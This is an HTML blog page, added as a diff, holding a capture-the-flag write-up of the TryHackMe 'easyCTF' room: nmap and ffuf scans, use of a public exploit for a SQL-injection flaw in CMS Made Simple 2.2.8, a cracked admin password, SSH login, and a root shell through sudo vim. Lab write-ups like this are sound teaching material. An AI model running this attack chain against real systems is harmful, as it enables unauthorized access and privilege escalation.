@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="easyCTF Enumeraion nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&amp;#39;t get directory listing: TIMEOUT| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/easyctf/easyctf/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="easyCTF Enumeraion nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#39;t get directory listing: TIMEOUT| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.">
+
+<meta itemprop="wordCount" content="559"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="easyCTF Enumeraion nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#39;t get directory listing: TIMEOUT| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="easyCTF Enumeraion nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#39;t get directory listing: TIMEOUT| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/easyctf/easyctf/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/easyctf/easyctf/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="easyctf">easyCTF</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeraion">Enumeraion</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT     STATE SERVICE REASON  VERSION
+21/tcp   open  ftp     syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: TIMEOUT
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.8.226.203
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries
+|_/ /openemr-5_0_1_3
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a💿a9:23 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
+|   256 9b:d1:65:07:51:08:00:61:98🇩🇪95:ed:3a:e3:81:1c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
+|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12]
+[Status: 200, Size: 11321, Words: 3503, Lines: 376]
+.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12]
+.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12]
+index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
+robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33]
+server-status           [Status: 403, Size: 298, Words: 22, Lines: 12]
+simple                  [Status: 301, Size: 309, Words: 20, Lines: 10]
+</code></pre><p>They say its easy</p>
+<p><code>robots.txt</code> is written by &lsquo;mike&rsquo;</p>
+<p>fuzzing show a simple page with 301 code&hellip;we visited and got a simple page made with cms made simple (CMSMS)</p>
+<p><code>This site is powered by CMS Made Simple version 2.2.8</code></p>
+<p>okay then&hellip;of of the pages say</p>
+<pre tabindex="0"><code>To get to the Administration Console you have to login as the administrator (with the username/password you mentioned during the installation process) on your site at http://yourwebsite.com/cmsmspath/admin. If this is your site click here to login.
+</code></pre><p>lets google</p>
+<p>Actually&hellip;found alot of cve that matches this version&hellip;but time-based sqli <code>CVE-2019-9053</code> was or best match</p>
+<p>There is an exploit from exploitdb provided&hellip;a python script we are gonna use</p>
+<p>Took me a bit to fix the script and make it work with python3 (I could just use python2 though)</p>
+<p>I had to :</p>
+<ul>
+<li>change shebang line on top to &lsquo;python3&rsquo; instead of &lsquo;python&rsquo;</li>
+<li>add parenthesis to the print statements</li>
+<li>fix an error with md5 (added encode UTF-8 before the hexdigest) in crack_password function</li>
+<li>made sure to point -u argument to the simple cms path&hellip;like http://ip_address/simple</li>
+<li>and the most frustrating the TIME variable! due to my stupid slow internet I had to increase the variable to 20 to have results and it obviously took me waaaay longer</li>
+</ul>
+<p>Anyway I got results</p>
+<pre tabindex="0"><code>[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+</code></pre><p>we ssh as mitch (remember the port is unusual -p 2222)</p>
+<p>And we get right into business!
+<code>$ cat user.txt</code></p>
+<h2 id="priilege-escalation">Priilege Escalation</h2>
+<pre tabindex="0"><code>$ sudo -l
+User mitch may run the following commands on Machine:
+(root) NOPASSWD: /usr/bin/vim
+</code></pre><p>OH NO NOT VIM&hellip;hey but wait..we can run commands in vim</p>
+<p>then its easy peazy</p>
+<p><code>sudo vim</code></p>
+<p>Then in vim we do:</p>
+<pre tabindex="0"><code>:!/bin/bash
+</code></pre><p>Ànd its over</p>
+<pre tabindex="0"><code>root@Machine:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Fastest privEsc in the west</p>
+<pre tabindex="0"><code>root@Machine:/root# cat root.txt
+</code></pre><p>its indeed an easy ctf&hellip;but its always fun to do</p>
+<p>glhf!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
